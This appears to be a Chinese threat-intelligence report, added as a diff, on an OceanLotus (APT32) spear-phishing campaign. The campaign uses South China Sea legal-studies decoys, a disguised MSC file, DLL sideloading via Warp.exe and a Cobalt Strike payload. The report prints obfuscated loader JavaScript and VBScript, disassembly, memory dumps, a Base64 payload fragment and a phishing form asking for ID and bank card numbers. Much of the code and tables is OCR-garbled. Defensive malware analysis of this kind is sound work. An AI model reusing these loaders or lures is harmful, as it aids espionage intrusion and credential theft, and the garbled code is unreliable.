@@ -1,0 +1,320 @@
+# 海莲花组织以南海的法律制度等为话题的攻击活动分析  
+
+原创猎影实验室网络安全研究宅基地2024年11月11日11:15浙江  
+
+  
+
+  
+
+## 事件概述  
+
+OceanLotus又名APT32、海莲花，是具有东南亚国家背景的APT组织。该组织自2015年披露以来，持续活跃至今，主要针对周边国家：中国、柬埔寨、泰国、老挝进行国家级网络间谍活动。其目标行业包括政府、金融、海事机构、海域建设部门、航运企业、科研院所和境内高校。  
+
+近日，猎影实验室捕获到OceanLotus（海莲花）针对境内的攻击活动，活动延续此前的攻击目标与攻击手法，即仍然通过鱼叉式网络钓鱼邮件针对国内海事机构。攻击活动流程大致如下：  
+
+1．该鱼叉式网络钓鱼邮件附件为包含有MSC文件的压缩包文件，其中MSC文件伪装成DOCX文件引诱目标用户点击；  
+
+2．MSC文件运行后将读取自身释放诱饵文档、白文件Warp.exe以及恶意DLL文件7z.dll，其中诱饵文档之一的内容为适用于南海的两种法律制度研究；  
+
+3．恶意DLL文件由白文件Warp.exe加载后，将在内存中解密多层Shellcode，最终执行CobaltStrikeBeacon，连接到C2服务器，并等待后续指令下发。  
+
+## 诱饵文件  
+
+三个MSC文件释放的诱饵文件分别如下：  
+
+1．适用于南海的两种法律制度研究  
+
+# 适用于南海的两种法律制度研究  
+
+引言  
+
+（一）研究背景  
+
+自2013年1月22日菲律宾根据1982年《联合国海洋法公约》（以下简称《公约>）就南海管辖权争议提起强制仲裁程序1，2014年12月5日美国国务院发布《海洋界限：中国在南海的海洋主张》第143号报告，2016年7月12日南海仲裁塞仲题庭作出非法裁决以及2022年1月12日美国国务院再次发布《海洋界限：中国在南海的海洋主张>第150号报告\*及其《国家实践补编》"以来，南海局势愈加波请云论，同时，伴随着美国海军“航行自由行动”的不时挑鲜以及相关国家有关南海地区的外交照会，无不表明不论是在法律、军事还是在外交领域，中国目前在南海面临着前所未有的困境及挑战。  
+
+通过法律、军事及外交手段的相互配合，美国试图全盘否定中国在南海的各项海洋权益和主张。“此外，不论是频繁提及南海伸规案裁决还是发布菲律宾语及越南语版本的<海洋界限》第150号报告执行摘要，美国致力于挑拨中国与南海圈边声索国之间关系的目的昭然若揭。不滩看出，美国在不断推进南海区域的法律战进程，以期升级南海区域的对抗局势，从而巩固其对国际海洋法规则和规范解释的主导权和话语权。  
+
+对于中国目前所面临的愈加严竣的海洋问题及挑战，中国在处理与南海周边利及远洋群岛基线制度等关键问题。因此，明确“一般国际法规则和原则”的概念、特征、内容、在国际海洋法中的地位和作用及其与《公约》的相互关系，对于中国应对来自周边及域外国家的海祥挑战而言具有积极的现实意义。  
+
+（二）研究意义  
+
+《公约》序言第八段内容表明，虽然《公约》通常被称作为“海洋宪章”但事实上《公约》并未穷尽一切与海洋相关的权利与义务事项，也并非所有涉及海洋法的问题均受《公约》管辖。基于文本分析，《公约》序言所载“一般国际法规则和原则”仍是一国主张海洋权利的权利依据。然而：不论是南海仲裁案性越庭所作耦决，抑或是美国国务院发布的《海洋界限》系列报告，均体现出“《公约》至上”、“《公约》规定取代一切先前存在权利”的观点。这种片面及错误的观点，无视了一般国际法规则和原则在调整与规范《公约》未尽权利与义务内容上的作用与价值，并背离了《维也纳条约法公约》的条约解释惯例。  
+
+有关《公约》与“一般国际法规则和原则”之间关系的研究却相对较少，用以佐证诸如“以《公约》为核心的当代海洋法是一个庞大的包括习惯法规则和条约法规则等一般国际法在内的规则体系”的观点的力量较为灌弱。特别是在面对历史性权利的主张以及大陆国家远洋群岛基线制度方面的法律挑战时，能够据以将理论与实践结合的学术分析较为贫乏。因此，本研究尝试脱离以《公约》为核心的裁判规范，并立足于当代国际社会的现实，试图为一般国际法规则和原则的适用提供理论与现实依据，以期为维护海洋权益而获得规范性支持。具体而言，  
+
+# 2.匿名审稿专家回执  
+
+# 匿名审稿专家回执  
+
+对于您为本刊付出的辛勤劳动，我们表示由衷的感谢，并致薄副。请您填写身份证信息和银行卡信息。我们真切希望，在您的热诚帮助下， $\therefore$ 国际论坛》会越办越好。  
+
+注：1.审稿费经校财务处发放：2.信用卡、邮政储蓄卡不可以。  
+
+<html><body><table><tr><td>姓名</td><td>身份证号</td><td>银行卡号</td><td>开户行具体到支行）</td></tr><tr><td></td><td>P</td><td></td><td></td></tr></table></body></html>  
+
+3．《国际论坛》匿名审稿专家邀请函  
+
+# 《国际论坛》匿名审稿专家邀请函  
+
+# 《国际论坛》审稿意见单  
+
+# 尊敬的教授：  
+
+您好！  
+
+鉴于您的高深学养，本刊特聘您为匿名评审专家。  
+
+本刊所刊稿件，全面实行双向匿名专家外审制度。为使这一制度进一步规范化，提高审續效果，思请您注意如下事项：  
+
+1.您收到稿件后，如不太熟悉稿件所涉领域或不方便审稿，请及时告知我们，以便重新选择审稿人：欢迎您推荐其他合适的审稿人；如您熟悉并愿意审阅，也请先给我们一个回复，并将审稿意见返回给我们。  
+
+2.无论您建议退稿还是刊用，均请认真填写“审稿意见单”（附后），退稿请给出切实依据，若可采用，请您务必结合文稿内容，给出详尽修改意见，避免不清具体内容的空泛评价。  
+
+# 3.评审意见返回日期： 2024年8月15日之前。  
+
+4.稿件内容，务请保密，不得外传。  
+
+5.本刊联系人和联系方式：杨股：183404234576163.com此致  
+
+敬礼！  
+
+# 一、论文题目  
+
+二、文稿水准评判（请在选项前划）。  
+
+政治问题： （)有 (V）无选题价值： （）优秀 （V）良好 （）一般 （）较差学术创见： （）优秀 （）良好 （V）一般 （）较差研究方法： （）优秀 （）良好 （V)一般 （）较差分析论证： （）优秀 （）良好 （)一般 （V）较差文献征引： （）优秀 （）良好 （)一般 （V）较差语言表述： （）优秀 （）良好 （V)一般 （）较差总体评价： （）优秀 （）良好 （V)一般 （）较差  
+
+# 三、文稿审查结论（请在选项前划）  
+
+（）建议刊用（）修改后刊用（）修改后再议（V）建议退稿  
+
+# MSC文件启动  
+
+## XML格式的MSC文件中存在有可疑的Javascript指令  
+
+91 <StringID="10"Refs="2">//ConsoleRoot   
+92 var u=external.Document.Name;var v="";var i=0;eval(decodeURIComponent("for\$20\$28is3D0&3Bi\$3Cu2Elengthe3 29%20%29%20%0AI7nAA%3Dhmnsr1tEA&280%29.text&0Aga5o1Y3fL8hM%3DVqIgc0623f86%28I7nAA%29%0ADim号20ED4rz40ASet%20ED4rz%3D 号20To%20uBound号28tiq2号29%20step号204%0Ae8xdh号3Dv5KomBegKS+28arrayByte3%28tiqz+28iter号29%29%29%2BarrayLong5%28arrayBy   
+93 </string>  
+
+### 其执行的内容经解码后如下，主要功能为加载XML中嵌入的VBScript执行  
+
+Var U=external.Document.Name;var v=;var   
+18;eva1（decodeURIComponent(for%20%281%3D0%3B1%3Cu%21ength%3B1%2B%2B%29%7Bh%3Du%2EcharCodeAt%281%29%2EtoString%2816%29%3Bv%2B%3D%28%22000%22%2Bh%29%2Es11c e%28%2D4%29%3B%7D"));var sN-external.Document.ScopeNamespace;var rN=sN.GetRoot();var mN=sN.GetChi1d(rN);var   
+dN=sN.GetNext(mN);external.Document.ActiveView.ActiveScopeNode=dN;dO=external.Document.ActiveView.Controlobject;external.Document.ActiveView.ActiveScopeNode mN;var XML=do;XML.async=false;var   
+xs1-XML;xs1.1oadXML（unescape(%3C%3Fxm1%20version%3D%271.0%27%3F%3E%eA%3Csty1esheet%0A%20%20%20%20xmlns%3D%22http%3A//wm.w3.org/1999/XSL/Transform%22%20xml ns%3Ams%30%22urn%3Aschemas-microsoft  
+com%3Axs1t%22%A%20%20%20%20xm1ns%3Auser%3D221aceho1der%22%A%20%2%20%2vers1on%3D%221.%22%3E%A%20%2%2%2%3Coutput%2method%3D%22text%2/%3E%A%2%2 %20%208%3Cms%3Ascript%20implements  
+pref1x%30%22user%22%201anguage%3D%22VBScr1pt%22%3E%A%e9%3C%21%SBCDATA%58%eADim%20msCLL%eAmsCLL%3D%22_MSC%22%BAFor%281%3D1%20to%20Len%28msCLL%29%20Step%204% 0Apyem%3Dpyem%20%26%20ChrW%28CLng%28Chr%28Int%28%2238%22%29%29%26Chr%28Int%28%2272%22%29%29%20%26%20Mid%28mscLL%2Ci%2C4%29%29%29%0ANext%eASet%20kNNBBk%3DCr eateObject%28Chr%28Int%28%22%26H4d%22%29%29%26Chr%28%26H69%29%26Chr%28Int%28%2299%22%29%29%26Chr%28%26H72%29%26Chr%28210456/1896%29%26Chr%28Int%28%22%26H73% 22%29%29%26Chr%28%26H6f%29%26Chr%281S0842/1471%29%26Chr%28Int%28%22116%22%29%29%26Chr%28Int%28%22%26H2e%22%29%29%26%22X%22%26Chr%28Int%28%2277%22%29%29%26Ch r%28%26H4c%29%26Chr%28Int%28%2268%22%29%29%26Chr%2879%29%26Chr%28%26H4d%29%20%29%AkNNwBBk.Async%3DChr%28Int%28%227e%22%29%29%26Chr%28Int%28%2297%22%29%29%2 6%221%22%26Chr%28Int%28%22115%22%29%29%26Chr%28%26H65%29%eAkNNWBBk.Load%28%20pyem%20%29%eAV7dvqr1MfEI%AFunct1on%20VqIqc06Z3f86%281np%29%ADim%20YhYRVjYqejI C%8ADim%20A1fZe%0ASet%20YhYRVjYqejIC%3DCreate0bject%28Chr%28Int%28%2277%22%29%29%26%22S%22%26%22X%22%26Chr%2898945/1285%29%26Chr%28%26H4c%29%26%222%22%26Chr %2846%29%26Chr%28Int%28%22%26H44%22%29%29%26Chr%28757-  
+
+678%29%26Chr%286853/89%29%26Chr%28Int%28%2268%22%29%29%26Chr%28Int%28%22%26H6f%22%29%29%26Chr%28Int%28%2299%22%29%29%26Chr%28%26H75%29%26Chr%28Int%28%22109%   
+22%29%29%26%22%22%26Chr%28%26H6e%29%26Chr%28%26H74%29%29%ASet%20A1fZe%30YhYRVjYqejIC.createlement%28%22a%22%29%A1fZe.DataType%30%22b%22%26%221%22%26%22  
+
+172731  
+
+TrRaw Bytes  
+
+### Output  
+
+var u=external.Document.Name;var v=";vari=;eval(decodeuRIComponent(for(1=0;i<u.length;i++){h=u.charCodeAt（i）.toString（16);v+=   
+("eoe+h).s1ice(-4）;)"));var sN=external.Document.ScopeNamespace;var rN=sN.GetRoot();var mN=sN,GetChi1d(r);var   
+dN=sN.GetNext（mN);external.Document.ActiveView.ActiveScopeNode=dN;dO=external.Document.ActiveView.Controlobject;external.Document.ActiveView.ActiveScopeNode   
+=mN;var XML=dO;XML.async=false;var xs1=XML;xs1.1oadXML(unescape("<?xml version=\*1.e\*?>   
+<stylesheet xmlns="http://ww.w3.org/1999/xXSL/Transform"xmlns:ms=urn:schemas-microsoft-com:xs1t" xmlns:user="placeholden" version="1.0"> <outputmethod="text"/> <ms:script implements-prefix=user"language="VBScript"> <![CDATA[   
+DimmscLL   
+mscLL="_MSC"   
+Fori=1to Len(mscLL)Step4   
+pyem-pyem&Chrw（CLng(Chr(Int(“38"））&chr（Int("72")）&Mid(mscLL,1,4））)   
+Next   
+Set   
+kNMwBBk=CreateObject（Chr(Int("&H4d")）&Chr（&H69）&Chr（Int（99"))&Chr（&H72）&Chr(21e456/1896)&Chr（Int("&H73"))&Chr(&H6f)8Chr（150042/1471)&Chr(Int（"116")）&Chr(In   
+t("&H2e")&"x"&Chr(Int（"77")）&Chr（&Hac)&Chr(Int("68")&Chr(79)&chr（8H4d))   
+kNNwBBk.Asvnc=Chr（Int("7e"))&Chr(Int("97"))&"1"&Chr(Int("115"))&Chr（&H65)  
+
+## VBScript脚本  
+
+VBScript脚本加载后主要释放三个文件：白文件Warp.exe、恶意DLL文件7z.dll到目录C:\Program Files\Cloudflare，以及诱饵文件"适用于南海的两种法律制度研究（稿件）.docx"到目录%Temp%  
+
+11 Set G7WaUUzB=Createobject("WScript.Shel1")   
+12 Set aocowTWm=Createobject("Scripting.FileSystemobject")   
+13 dp3Vb=G7WaUUzB.ExpandEnvironmentStrings("&ProgramFiles")   
+14 iIbaE7AGCNO9=dp3vb&"\\Cloudflare"   
+15 aocowTWm.CreateFolder(iIbaE7AGCNO9)   
+16 F6HOe=iIbaE7AGCNO9&"\\Warp.exe"   
+17 SsOmk=iIbaE7AGCNO9&"\\7z.d11"   
+18 For i=1 to Len(ocI5Wdrci） Step 4   
+19 TKoz8djsy=TKoz8djsy&ChrW(CLng（Chr（Int（"38"))&Chr（Int（"72"))&Mid(OcI5Wdrci，i，4)))   
+20 Next  
+
+释放文件来自源文件，名为CONSOLE_TREE、CONSOLE_MENU、以及CONSOLE_PANE的标签，通过Base64解码后写入对应的文件路径  
+
+  
+海莲花组织以南海的法律制度等为话题的攻击活动分析  
+
+### 最后打开诱饵文件、带参数"t8.8.8.8"启动白文件Warp.exe  
+
+30 ED4rz.SaveToFile HFFNGwV,2   
+31 G7WaUUzB.run &HFFNGWV&""，1,false   
+50 G7WaUUzB.run &F6HOe&""&"t8.8.8.8",0,false   
+51 End Function  
+
+## DLL文件侧载  
+
+DLL文件侧载是一种利用程序加载DLL文件进行恶意操作的攻击技术，正常情况下，应用程序会依赖系统提供的动态链接库（DLL）执行特定功能。攻击者则通过修改或替换这些DLL文件，使应用程序加载恶意代码。  
+
+利用DLL文件劫持是OceanLotus组织常用的一种攻击手法，该组织在历史攻击活动中劫持过的白文件包括：WinWord.exe（Word主程序）、MicrosoftUpdate.exe（微软升级程序）、SoftManager.exe（360软件管理器）、GoogleUpdate.exe（谷歌更新程序）、LenovoDrvTray.exe（联想驱动管理程序）、RasTlsc.exe（赛门铁克产品组件）、LenovoDesk.exe（联想桌面应用) 等。  
+
+此次捕获到OceanLotus使用的恶意DLL文件7z.dll由Warp.exe侧加载，其中Warp.exe证书信息如下：  
+
+  
+
+白文件加载7z.dll后，获取其导出表GetNumberOfMethods进行调用  
+
+.text:0041c802 push offset aGetnumberofmet;"GetNumberOfMethods"   
+.text:0041c807 push dwordptr[esi]；hModule   
+.text:0041c809 mov [esp+50h+var_8],1   
+.text:0041c811 call ds:GetProcAddress   
+.text:0041c817 test eax,eax   
+.text:0041c819 jz short 1oc_41c82A   
+.text:0041C81B lea ecx,[esp+48h+var_8]   
+.text:0041C81F push ecx   
+.text:0041c820 call eax  
+
+首先解密出字符串"cloudflare.warp.process"，并以此为名创建互斥体  
+
+45 $\begin{array}{r l}{\mathbf{\nabla}\mathbf{\psi}}&{{}\mathbf{\psi}=}\end{array}$ sub_10001F00(v3); //cloudflare.warp.process   
+46 $\downarrow27=$ !sub_10015620(v4) 11 !sub_10010E50(); //创建互斥体   
+47 \*&v5 $=$ sub_100710A0(v27,HIDWORD(v27)).m128_u64[0];   
+48 $v6=$ sub_100013A0(v5);  
+
+接着获取一组API函数地址用于获取命令行参数并进行验证  
+
+海廷化组织以用母时云伴度守为怕题时以山泊动刀州   
+463 v375 $=$ getFunAdd（v2,v280); //GetCommandLineW   
+464 V404 $=0$   
+465 v403=0;   
+466 $v3=$ sub_10013260(v337);   
+467 V281 $=$ sub_10019AD0(v3);   
+468 $\begin{array}{r l}{{}\mathbf{\nabla}\mathbf{\psi}}&{{}=}\end{array}$ sub_10013180（v307);   
+469 $\yen5=$ sub_10019AF0(v4);   
+470 v356 ${}={}$ getFunAdd(v5,v281);   
+471 $v4\theta2=\theta$   
+472 ${\vee}447~=~\Theta$   
+473 $\zeta6=$ sub_10013410(v336);   
+474 v282 $\l=$ sub_10019A90(v6);   
+475 $\begin{array}{r l}{\mathbf{v}7}&{{}=}\end{array}$ sub_10013330(v305);   
+476 $\mathrm{~v~}8\mathrm{~=~}$ sub_10019AB0(v7);   
+477 V393 $=$ getFunAdd(v8,v282); //1strcmpw   
+541 v40 $=$ sub_10013AB0(v333);   
+542 V451 $=$ sub_100199B0(v40);   
+543 V399 $\Bumpeq$ v356(v374,&v451); //调用CommandLineToArgvW，提取参数   
+544 V41 $\l=$ byte_100E1AC6;   
+545 $\downarrow42=$ sub_10001380()+v41;   
+589 v64 $=$ sub_10013B80(v296);   
+590 v65 $=$ sub_10019990(v64);   
+591 v346 $\l=$ v393(v399[2],v65) $==6$ //调用strcmpW，验证参数   
+592 v66 $=$ sub_100710A0(v346,HIDWORD(v346)).m128_u64[0];   
+593 v67 $=$ sub_10004020(v66);   
+594 V68 $=$ byte_100E1AC6;   
+137 $\vee23=$ sub_100088A0(v63);   
+138 $\downarrow24=$ sub_1001A410（v23,a1); //\1.\pipe\%s   
+139 v74(v97,v24); //wsprintfw拼接得到\1.\pipe\ntsvcs   
+140 $v90=\theta.$   
+141 v89=0;   
+142 $\yen23,45$ sub_10008A40(v67);   
+143 v57 $=$ sub_1001A3D0(v25，0,0);   
+144 v26 $=$ sub_10008970(v66);   
+145 $\vee27=$ sub_1001A3F0（v26，0,0,v57);   
+146 v83 $=$ v79（v97，v27，v55，v56，v58，v59，v62);//CreateFileW创建命名管道ntsvcs   
+147 $\vee28=$ byte_100E1AC6;  
+
+使用ReadFile、WriteFile从/向管道读取/写入数据  
+
+266 $v5=$ sub_1001A590（v4);   
+267 v238 $\l=$ getFunAdd(v5,v174);   
+268 $v250~=~\theta$   
+269 $v249~=~\Theta$   
+270 $\vee6=$ sub_100078A0(v181);   
+271 v175 $=$ sub_1001A530(v6);   
+272 $\begin{array}{r l}{\mathbf{\nabla\times}7}&{{}=}\end{array}$ sub_100077c0(v177);   
+273 $\begin{array}{r l}{\mathbf{\nabla\times}\mathbf{8}}&{{}=}\end{array}$ sub_1001A550(v7);   
+274 $\vee212=$ getFunAdd（v8，v175);   
+275 $\begin{array}{r l}{\mathbf{\nabla}\times\circ~}&{{}=}\end{array}$ byte_100E1AC6;  
+
+获取Chakra.JsProjectWinRTNamespeace函数的内存，并通过VirtualProtect更改其属性为读写权限  
+
+海莲花组织以南海的法律制度等为话题的攻击活动分析  
+
+
+<html><body><table><tr><td>10016F65 10016F66 10016F69 10016F6A 10016F6D</td><td>50 push 8B45D8 50 push 8B4D08 8611</td><td>eax mov eax,dword ptr ss:[ebp-28] eax movecx,dword ptrss:[ebp+8] movedx,dword ptr ds:[ecx]</td><td>edx:JsProjectwinRTNamespace, Le</td></tr><tr><td>10016F6F 10016F70</td><td>52 FF55A4</td><td>push edx dwordptr ss:[ebp-5c]</td><td>edx:JsProjectwinRTNamespace [ebp-5c]:virtualprotect</td></tr><tr><td>10016F73 10016F75</td><td>85c0 7514</td><td>test eax,eax jne 7z.10016F8B</td><td></td></tr><tr><td>10016F77</td><td>33C0</td><td>xor eax,eax</td><td></td></tr><tr><td>10016F79 10016F83</td><td>C785 58FFFFFF0100000 8985 5CFFFFFF</td><td>mov dword ptr ss:[ebp-A8],1 mov dword ptr ss:[ebp-A4],eax</td><td></td></tr></table></body></html>
+
+dwordptr ss:[ebp-5c]=[0019F4E4"pz(u"]=<kerne132.VirtualProtect>  
+
+.text:10016F70 7z.d11:S16F70 #16370 .text:10017237 7z.d11:\$17237 #16637 最终内存中加载的有效负载仍为CobaltStrikeBeacon  
+
+<html><body><table><tr><td colspan="2">内存1</td><td colspan="2">内存2</td><td colspan="2">内存3 内存4</td><td colspan="2">内存5</td><td colspan="2">监视1 [x-1局部变量</td><td colspan="2">结构体</td></tr><tr><td colspan="2">地址</td><td colspan="3">十六进制</td><td colspan="4">C204 00</td><td colspan="2"></td></tr><tr><td>69948200 69948210</td><td colspan="3">558BEC 8D450850E809 CCCCCC CC CC6A3CB8</td><td colspan="4">000000 5D OA C8B2 69 E8D0D61B</td><td colspan="2">ASCII U.1.E.Pe... fiffti<..E-ieDo</td><td colspan="3" rowspan="4"></td></tr><tr><td>69948220</td><td>00FF35</td><td>D8</td><td>80D669FF</td><td></td><td>15B8F1E7</td><td>6933DB8B FF85C075</td><td>y50.0iy.nci30.</td><td></td><td></td></tr><tr><td>69948230</td><td></td><td>F0438B</td><td>CE 6A 00</td><td>8AD3</td><td>E8F311FE</td><td></td><td></td><td>oc.fj..Oeo.py.Au</td><td></td></tr><tr><td>69948240</td><td>63 8B</td><td>76 04</td><td>8D 7D</td><td>BC21</td><td>45FC 8D 4D</td><td>D02145B8</td><td></td><td>C.V..4!EU.MD!E</td><td></td></tr><tr><td>69948250</td><td></td><td>AB535353</td><td>FF75</td><td>04AB</td><td>8975 EC</td><td>AB AB</td><td>AB8D45</td><td>《SSSyu..ui《.E</td><td></td></tr><tr><td>69948260</td><td></td><td>B85056E8</td><td>B82512</td><td>00</td><td>5353 8B CE</td><td>88 5D</td><td>FCE8</td><td>Pve%..5s.1.]ue</td><td></td></tr><tr><td>69948270</td><td>2C36</td><td>11 00</td><td>8D4DD0E8</td><td></td><td>D52A12 00</td><td>FF35D880</td><td>.6...MDe0*..y50</td><td></td><td></td></tr><tr><td>69948280</td><td>D669FF15</td><td></td><td>B8F1E769</td><td></td><td>8BC88B45</td><td>08FF 30E8 FO E81E2A</td><td></td><td>oiy..nci.E.E.yoe</td><td></td></tr><tr><td>69948290</td><td></td><td>165D1C00</td><td>8D4DD0C6</td><td></td><td>45FC 008B</td><td>CCCCCCCC</td><td></td><td>...MDAEu..Oe.</td><td></td></tr><tr><td>699482A0</td><td>12</td><td>00 8B C6</td><td></td><td>E894D51B</td><td>00 C204 00</td><td>CCCCCCCC</td><td></td><td>Ae.o..A..ffff tttitititttttttt</td><td></td></tr></table></body></html>
+
+随后将Shellcode写入该内存，再次通过VirtualProtect更改其属性为可执行  
+
+<html><body><table><tr><td>1001722C 1001722D 10017230 10017231</td><td>50 8B45D8 50</td><td>push eax mov eax,dword ptr ss:ebp-28] push eax movecx,dword ptr ss:[ebp+8]</td><td></td></tr><tr><td>10017234 10017236</td><td>8B4D08 8B11 52</td><td>movedx,dword ptr ds:[ecx] push edx</td><td>edx:JsProjectwinRTNamespace, [e edx:JsProjectwinRTNamespace</td></tr><tr><td>10017237 1001723A</td><td>FF55A4</td><td>cal1 dword ptr ss:[ebp-5c]</td><td>[ebp-5c]:virtualProtect</td></tr><tr><td>1001723C</td><td>85C0</td><td>testeax,eax jne 7z.10017252</td><td></td></tr><tr><td>1001723E</td><td>7514 33C0</td><td>xor eax,eax</td><td></td></tr><tr><td>10017240</td><td>C7855 5OFFFFFF 0100000</td><td>mov dword ptr ss: ：[ebp-B0],1</td><td></td></tr><tr><td>1001724A</td><td>898554FFFFFF</td><td>mov dword ptr ss:[ebp-Ac],eax</td><td></td></tr></table></body></html>
+
+dwordptr ss:[ebp-5c]=[0019F4E4"pz(u"]=<kerne132.VirtualProtect>  
+
+<html><body><table><tr><td>内存1</td><td>内存2</td><td>内存3</td><td>内存4</td><td></td><td>内存5</td><td></td><td>监视1</td><td>[x-局部变量</td><td>结构体</td></tr><tr><td>地址</td><td colspan="7"></td><td>ASCII</td><td></td></tr><tr><td>十六进制 69948200</td><td colspan="7"></td><td>.MZREe.</td><td></td></tr><tr><td>69948210</td><td>00005B89</td><td>DF5589E5</td><td></td><td>81C3B79C</td><td></td><td>0000FF D3</td><td></td><td>[.Bu.a.A....yo</td><td></td></tr><tr><td>69948220</td><td>68F0B5A2</td><td>56680400</td><td></td><td>000057FF</td><td>DO</td><td>000000</td><td></td><td>houcvh....wyD..</td><td></td></tr><tr><td></td><td>00000000</td><td>00000000</td><td></td><td>00000000</td><td></td><td>00000000</td><td></td><td></td><td></td></tr><tr><td>69948230</td><td>00000000</td><td>00 F8</td><td>0000 00</td><td>D2 71</td><td>4F 58</td><td>135473</td><td></td><td>.0...OqOX.TS</td><td></td></tr><tr><td>69948240</td><td>BFB406 77</td><td>00 71</td><td>OC 58 10</td><td>3DOF</td><td>62 DD</td><td>DE EF DB</td><td></td><td>w.q.X.=.bYpi0</td><td></td></tr><tr><td>69948250</td><td>E6CODF</td><td>B4 FO 92</td><td>21 4E</td><td>2D 024C</td><td>94 2D</td><td>398E</td><td>14</td><td>PAB'O.!N-.L.-9.</td><td></td></tr><tr><td>69948260</td><td>090B38</td><td>E5</td><td>3D559E3F</td><td>54 B08123</td><td>3B</td><td>A17E02</td><td></td><td>.8a=U.?T.#；i~</td><td></td></tr><tr><td>69948270</td><td>12 64E1</td><td>22 4D</td><td>E87BA8</td><td>384465CF</td><td></td><td>6B293F7A</td><td></td><td>da"Me"8DeIk)?z</td><td></td></tr><tr><td>69948280</td><td>A1 84672A</td><td>6102B8A8</td><td></td><td>84A8E947</td><td></td><td>F9B286 3B</td><td>i.g"a.</td><td>"eGu.</td><td></td></tr><tr><td>69948290</td><td></td><td>33398C4A</td><td></td><td>757D4638</td><td></td><td>6A5A3E67</td><td></td><td>.+A39.Ju}F8jZ>g</td><td></td></tr><tr><td>699482A0</td><td>1D 2B20 C5</td><td></td><td></td><td>D8192735</td><td></td><td>E9321E_DZ</td><td></td><td></td><td></td></tr><tr><td colspan="2">699482R0 57889912</td><td colspan="3">63904624</td><td colspan="2"></td><td></td><td>ESo's2</td><td></td></tr></table></body></html>  
+
+海莲花组织以南海的法律制度等为话题的攻击活动分析  
+
+
+<html><body><table><tr><td>69948202 06 69948203 90</td><td>06 90</td><td>nop nop</td><td>JsProjectwinRTNamespace</td></tr><tr><td>69948204 90 69948205 06 69948206 90 69948207 90 69948208 06 69948209 4D 6994820A 5A 6994820B 52 6994820C 45 6994820D E8 69948212 5B 69948213 89DF 69948215 55 69948216 89E5 69948218 81C3 6994821E FFD3 69948220 69948225</td><td>nop nop nop nop nop nop nop dec pop pushedx incebp 00000000 pop mov pushebp B79C0000 callebx 68F0B5A256 6804000000 push 立 push FFDO cal1 add</td><td>ebp edx chakra.69948212 ebx edi,ebx movebp,esp add ebx,9CB7 puSh56A2B5F0 edi eax byte ptr ds [eax] al</td><td>calls0</td></tr><tr><td>6994822F</td><td>0000 0000</td><td>byte ptr ds eax al</td><td></td></tr><tr><td>69948231 0000</td><td>ppe add</td><td>byte ptr eax al</td><td></td></tr><tr><td>69948233</td><td>ppe</td><td>byte ptr eax al</td><td></td></tr><tr><td>69948235</td><td>0000</td><td>ds</td><td></td></tr><tr><td></td><td>0000</td><td>add byte ptr eax al</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>69948237</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>add byte ptr ds eax al</td><td></td></tr><tr><td>69948239</td><td>0000</td><td></td><td></td></tr><tr><td>6994823B</td><td>0000</td><td>add byte ptr sp eax al</td><td></td></tr><tr><td></td><td></td><td>add byte ptr ds eax] ,al</td><td></td></tr><tr><td></td><td>0000</td><td></td><td></td></tr><tr><td>024E95DC</td><td>8BFF</td><td>mov edi,edi</td><td>CobaltStrikeBeacon入口点</td></tr><tr><td>024E95DE</td><td>55</td><td>push ebp</td><td></td></tr><tr><td>024E95DF</td><td>8BEC</td><td>mov ebp,esp</td><td></td></tr><tr><td>024E95E1</td><td>837D0C01</td><td>cmp dword ptr ss:[ebp+c],1</td><td></td></tr><tr><td></td><td></td><td>jne 24E95EC</td><td></td></tr><tr><td>024E95E5</td><td>7505</td><td>Ca1124F0DA8</td><td></td></tr><tr><td>024E95E7</td><td>E8 BC770000</td><td>push dword ptr ss:[ebp+8]</td><td></td></tr><tr><td>024E95EC</td><td>FF7508</td><td>mov ecx,dword ptr ss:[ebp+10]</td><td></td></tr><tr><td>024E95EF</td><td>8B4D10</td><td>mov_edx,dword ptr ss:[ebp+c]</td><td>[ebp+10]:"靶R"</td></tr><tr><td>024E95F2</td><td>8B550C</td><td>24E94E6</td><td></td></tr><tr><td>024E95F5</td><td>E8ECFEFFFF</td><td>pop ecx</td><td></td></tr><tr><td>024E95FA</td><td>59</td><td>ebp</td><td></td></tr><tr><td>024E95FB</td><td>5D</td><td>pop</td><td></td></tr><tr><td>024E95FC</td><td></td><td>ret</td><td></td></tr><tr><td></td><td>C20c00</td><td></td><td></td></tr></table></body></html>  
+
+# 规避手段  
+
+1．MSC文件图标设置为Word图标，在默认隐藏文件后缀的主机上真假难辨  
+
+  
+
+## 2.MSC文件在携带PE文件资源时使用了Base64编码，以规避静态检测  
+
+107 <Binary Name="CONSOLE_TREE">UEsDBAoAAAAAAIdO4kAAAAAAAAAAAAAAAAAJAAAAZG9jUHJvcHMvUEsDBBQAAAAIAIdO4kA38q/jegEAAI8 uMcNTLF8Vxb1VxhPLJ/j+n1Tls3R5x+XxevVm6U5CNPD/KbOykPuATUwXutv6u0AA+Qx7Oex84f/A1BLAwQUAAAACACHTuJATQLpxIcVAACj0AAAEgA eYbiUNCR/sQty/JTmWSfjojhSL6yPqZJwaf3QfVaaPTHThSn+ikA3UqGq5VMq4YNpP4F3FZCXouU/GjoFli1s1/owWu9Vae+/EhBj+oj9AAoPkBWGun 9XT8EG+BD5WhkLL4BjOhRy/sifU+cBsmrITn8OJZvEXutONh3Ue7rJ9cSJEJvdD0B230JxUhGUcZG1Gi70FMMEo68SzTPwYPFYzADKvEpsVCSvRvqwt h2DtKCI4I+g1Zw+ZraAvgWWxMzQtUgInwm2G66Am590JsHVkCsPkaX02EUxbYVqJdAIQrH44NLgF3ArvSkQp1Y7ftbVNwEEJF7g0rIw/U2YQ7KMAkM5! b4cHjiaZGopHleheOeaQeokU3LOz0hC4xxQinpabeXtsQ9MYDXXQS8dR1J1oqweJDGxk4LpsLDmVwd7Qx15DPYr7eeuQYH/zdd5t9d60Ofr9PXvD3tH  
+
